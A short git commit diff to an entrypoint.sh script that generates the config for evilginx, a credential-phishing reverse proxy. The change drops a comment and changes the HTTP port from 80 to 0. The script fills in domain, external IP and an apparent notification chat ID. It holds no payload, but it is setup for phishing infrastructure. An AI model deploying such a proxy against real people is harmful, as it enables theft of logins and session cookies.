d4a2c21ac2fd16829c56867b6b6ce1d4101eb257
svrpsdev <jack.harlow1@yahoo.com>
2026-08-01 14:42:25 +0000

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -2,7 +2,6 @@
 set -e
 mkdir -p /root/.evilginx
 
-# Provide defaults to avoid invalid JSON
 DOMAIN=${DOMAIN:-"localhost"}
 EXTERNAL_IP=${EXTERNAL_IP:-"127.0.0.1"}
 CHAT_ID=${CHAT_ID:-""}
@@ -12,7 +11,7 @@ PORT=${PORT:-443}
 cat > /root/.evilginx/config.json <<EOF
 {
   "server_ip": "0.0.0.0",
-  "http_port": 80,
+  "http_port": 0,
   "https_port": ${PORT},
   "domain": "${DOMAIN}",
   "ipv4_external": "${EXTERNAL_IP}",
